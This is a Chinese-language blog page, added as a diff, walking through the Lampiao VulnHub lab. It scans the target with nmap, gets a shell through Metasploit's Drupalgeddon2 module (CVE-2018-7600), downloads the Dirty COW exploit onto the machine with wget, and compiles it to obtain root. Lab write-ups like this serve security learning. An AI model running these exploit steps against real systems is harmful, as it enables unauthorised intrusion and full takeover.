@@ -1,0 +1,595 @@
+
+ <!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  
+    <title>lampiao靶机渗透 | D&#39;Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="D">
+    
+
+    
+    <meta name="description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta name="keywords" content="靶机渗透,web-靶机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lampiao靶机渗透">
+<meta property="og:url" content="http://blog.wangluomingong.top/2018/08/28/Lampiao渗透writeup/index.html">
+<meta property="og:site_name" content="D&#39;Blog">
+<meta property="og:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535423025729.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535423091532.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535423283994.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535424108502.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535424224727.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535424960597.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535425304208.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535425471858.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535436388942.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535436485094.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535436558100.png">
+<meta property="og:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535436634779.png">
+<meta property="og:updated_time" content="2019-01-06T13:11:25.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="lampiao靶机渗透">
+<meta name="twitter:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
+<meta name="twitter:image" content="http://blog.wangluomingong.top/images/Lampiao%E6%B8%97%E9%80%8F/1535423025729.png">
+
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/08/28/Lampiao渗透writeup/" title="lampiao靶机渗透" itemprop="url">lampiao靶机渗透</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="D" target="_blank" itemprop="author">D</a>
+		
+  </p><p class="article-time">
+    <time datetime="2018-08-27T16:00:00.000Z" itemprop="datePublished"> Published 2018-08-28</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<html><body style="padding: 20px;"><marquee><span style="font-weight: bolder;font-size: 20px;color: red;"><a href="<https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA?view_as=subscriber>"><font color="red">声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负</font></a></span></marquee></body></html>
+
+
+
+<a id="more"></a>
+
+<h1 id="靶机下载地址"><a href="#靶机下载地址" class="headerlink" title="靶机下载地址"></a>靶机下载地址</h1><ul>
+<li><strong>Download</strong>: <a href="https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM" target="_blank" rel="noopener">https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM</a></li>
+<li><strong>Download (Mirror)</strong>: <a href="https://download.vulnhub.com/lampiao/Lampiao.zip" target="_blank" rel="noopener">https://download.vulnhub.com/lampiao/Lampiao.zip</a></li>
+<li><strong>Download (Torrent)</strong>: <a href="https://download.vulnhub.com/lampiao/Lampiao.zip.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/lampiao/Lampiao.zip.torrent</a>     (<a href="magnet:?xt=urn:btih:4D5F3BF538D6741C141F4749AA171B06CD2D607D&dn=Lampiao.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969" target="_blank" rel="noopener"> Magnet</a>)</li>
+</ul>
+<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><pre><code>得到靶机的最高权限</code></pre><h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><h2 id="1，找到靶机ip"><a href="#1，找到靶机ip" class="headerlink" title="1，找到靶机ip"></a>1，找到靶机ip</h2><p>因为我的虚拟机是172.24.10.0网段的，所以扫描的172.24.10.0/24</p>
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535423025729.png" alt="1535423025729"></p>
+<p>找到ip地址是172.24.10.109并且发现开放了<strong>22</strong>和<strong>80</strong>端口</p>
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535423091532.png" alt="1535423091532"></p>
+<p>访问一下80端口</p>
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535423283994.png" alt="1535423283994"></p>
+<h2 id="2，开始寻找漏洞"><a href="#2，开始寻找漏洞" class="headerlink" title="2，开始寻找漏洞"></a>2，开始寻找漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 172.24.10.109</span><br></pre></td></tr></table></figure>
+
+<p>发现端口1898上有个Drupal 7 </p>
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535424108502.png" alt="1535424108502"></p>
+<p>看下这个端口真的有个网站</p>
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535424224727.png" alt="1535424224727"></p>
+<h2 id="3，开始攻击"><a href="#3，开始攻击" class="headerlink" title="3，开始攻击"></a>3，开始攻击</h2><p>这个网站的漏洞还是比较多的</p>
+<h3 id="1），打开msfconsole"><a href="#1），打开msfconsole" class="headerlink" title="1），打开msfconsole"></a>1），打开msfconsole</h3><pre><code>首先升级msfconsole</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get  install metasploit-framework</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535424960597.png" alt="1535424960597"></p>
+<h3 id="2），开始利用cve漏洞getshell"><a href="#2），开始利用cve漏洞getshell" class="headerlink" title="2），开始利用cve漏洞getshell"></a>2），开始利用cve漏洞getshell</h3><pre><code>这里利用的是CVE-2018-7600
+
+开始设置msf        </code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 172.24.10.109</span><br><span class="line">rhost =&gt; 172.24.10.109</span><br><span class="line">msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 1898</span><br><span class="line">rport =&gt; 1898</span><br><span class="line">msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>成功getshell</p>
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535425304208.png" alt="1535425304208"></p>
+<p>查看一下机器的型号</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用命令：lsb_release -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535425471858.png" alt="1535425471858"></p>
+<h3 id="3），开始提权"><a href="#3），开始提权" class="headerlink" title="3），开始提权"></a>3），开始提权</h3><pre><code>找到提取的程序；利用的是脏牛提取即CVE-2016-5195</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/40847/</span><br></pre></td></tr></table></figure>
+
+<pre><code>把程序下载下来，因为我的是联网的，可以直接下载，如果你的不联网，可以在kali里开启http服务，**把程序下载到/tmp目录下**</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget  https://www.exploit-db.com/download/40847.cpp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535436388942.png" alt="1535436388942"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">执行：</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">./dcow -s </span><br><span class="line">./dcow  #得到root密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535436485094.png" alt="1535436485094"></p>
+<p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535436558100.png" alt="1535436558100"></p>
+<h3 id="4），root连接ssh连接"><a href="#4），root连接ssh连接" class="headerlink" title="4），root连接ssh连接"></a>4），root连接ssh连接</h3><p><img src="/../images/Lampiao%E6%B8%97%E9%80%8F/1535436634779.png" alt="1535436634779"></p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用CVE-2018-7600</span><br><span class="line">利用CVE-2016-5195</span><br></pre></td></tr></table></figure>
+
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/靶机渗透/">靶机渗透</a><a href="/tags/web-靶机/">web-靶机</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://blog.wangluomingong.top/2018/08/28/Lampiao渗透writeup/" data-title="lampiao靶机渗透 | D&#39;Blog" data-tsina class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev">
+ <a href="/2018/08/29/node1wp/" title="HackTheBox - Node Writeup">
+  <strong>上一篇：</strong><br>
+  <span>
+  HackTheBox - Node Writeup</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2018/08/28/竞赛中常用的脚本/" title="竞赛中常用的脚本">
+ <strong>下一篇：</strong><br> 
+ <span>竞赛中常用的脚本
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#靶机下载地址"><span class="toc-number">1.</span> <span class="toc-text">靶机下载地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#目的"><span class="toc-number">2.</span> <span class="toc-text">目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#开始渗透"><span class="toc-number">3.</span> <span class="toc-text">开始渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1，找到靶机ip"><span class="toc-number">3.1.</span> <span class="toc-text">1，找到靶机ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2，开始寻找漏洞"><span class="toc-number">3.2.</span> <span class="toc-text">2，开始寻找漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3，开始攻击"><span class="toc-number">3.3.</span> <span class="toc-text">3，开始攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1），打开msfconsole"><span class="toc-number">3.3.1.</span> <span class="toc-text">1），打开msfconsole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2），开始利用cve漏洞getshell"><span class="toc-number">3.3.2.</span> <span class="toc-text">2），开始利用cve漏洞getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3），开始提权"><span class="toc-number">3.3.3.</span> <span class="toc-text">3），开始提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4），root连接ssh连接"><span class="toc-number">3.3.4.</span> <span class="toc-text">4），root连接ssh连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-总结"><span class="toc-number">3.4.</span> <span class="toc-text">4.总结</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/web安全/" title="web安全">web安全<sup>9</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sql注入/" title="sql注入">sql注入<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mysql/" title="mysql">mysql<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/c/" title="c++">c++<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/自考/" title="自考">自考<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web-靶机/" title="web-靶机">web-靶机<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/数据结构/" title="数据结构">数据结构<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/靶机渗透/" title="靶机渗透">靶机渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/二进制安全/" title="二进制安全">二进制安全<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/pwn/" title="pwn">pwn<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ssh/" title="ssh">ssh<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/内网渗透/" title="内网渗透">内网渗透<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/web漏洞/" title="web漏洞">web漏洞<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ssrf/" title="ssrf">ssrf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/access/" title="access">access<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/靶机/" title="靶机">靶机<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/博客/" title="博客">博客<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://blog.51cto.com/tdcqvip" target="_blank" title="弃用博客地址">弃用博客地址</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA?view_as=subscriber" target="_blank" title="订阅频道">订阅频道</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://xj.hk/" target="_blank" title="导航网">导航网</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://y4er.com/" target="_blank" title="y4er">y4er</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://phpinfo.me" target="_blank" title="Lcy">Lcy</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://paper.seebug.org" target="_blank" title="seebug">seebug</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://hu3sky.ooo/" target="_blank" title="hu3sky">hu3sky</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://2kb.me/" target="_blank" title="每日必看-2kb">每日必看-2kb</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.52tech.tech/" target="_blank" title="每日必看-52tech">每日必看-52tech</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.52bug.cn/" target="_blank" title="每日必看-52bug">每日必看-52bug</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer">
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 欢迎来到我的博客 <br>
+			请在友情链接里订阅我的频道</p>
+	</section>
+	 
+	<div class="social-font">
+		
+		
+		<a href="https://github.com/heavenlyvip" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:duwentao.dwt@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2019 
+		
+		<a href="/about" target="_blank" title="D">D</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
